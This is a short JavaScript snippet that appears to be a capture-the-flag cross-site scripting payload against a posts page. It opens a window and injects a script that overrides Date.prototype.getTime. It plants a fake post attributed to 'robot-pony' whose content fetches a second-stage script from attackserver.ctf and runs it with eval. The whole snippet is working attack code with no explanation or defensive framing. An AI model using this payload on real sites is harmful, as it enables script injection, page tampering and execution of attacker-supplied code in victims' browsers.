(async () => {
    try {
        var newWindow = window.open('{BASE_URL}posts/');
        // Open a new window

        var script = newWindow.document.createElement('script');
        script.textContent = `
        Date.prototype.getTime = function () {
            setTimeout(function () {
                // Create a new div element
                var newPostDiv = document.createElement('div');
                newPostDiv.className = 'post';
        
                // Create a paragraph for the author
                var authorParagraph = document.createElement('p');
                authorParagraph.className = 'author';
                authorParagraph.textContent = 'robot-pony';
        
                // Create a paragraph for the content
                var contentParagraph = document.createElement('p');
                contentParagraph.className = 'content';
                contentParagraph.textContent = 'fetch(\\'http://attackserver.ctf/xss2.js\\').then(response => response.text()).then(sC => {eval(sC);}).catch(e => console.error(\\'Error:\\', e));';
        
                // Append the paragraphs to the new div
                newPostDiv.appendChild(authorParagraph);
                newPostDiv.appendChild(contentParagraph);
        
                var pageDiv = document.querySelector('div.page');
                console.log(pageDiv);
        
                // Check if pageDiv is not null before appending
                if (pageDiv) {
                    // Append the new div to the div.page element
                    pageDiv.appendChild(newPostDiv);
                } else {
                    console.error('div.page element not found');
                }
            }, 1);
            // Original getTime function
            return new Date().valueOf();
        };
        `;
        newWindow.document.head.appendChild(script);
    } catch (e) {
        console.error(e);
    }
})();